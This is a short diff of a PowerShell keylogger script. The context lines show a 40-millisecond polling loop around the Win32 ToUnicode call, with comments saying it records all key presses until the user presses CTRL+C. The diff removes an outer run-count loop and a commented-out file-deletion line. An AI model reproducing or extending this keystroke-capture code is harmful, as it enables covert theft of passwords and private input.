@@ -30,8 +30,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
     # create endless loop. When user presses CTRL+C, finally-block
     # executes and shows the collected key presses
-    $Runner = 0
-	while ($TimesToRun  -ge $Runner) {
 	while ($TimeEnd -ge $TimeNow) {
       Start-Sleep -Milliseconds 40
       
@@ -66,8 +64,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
       }
 	  $TimeNow = Get-Date
     }
-	#Remove-Item -Path $Path -force
-	}
 }
 
 # records all key presses until script is aborted by pressing CTRL+C
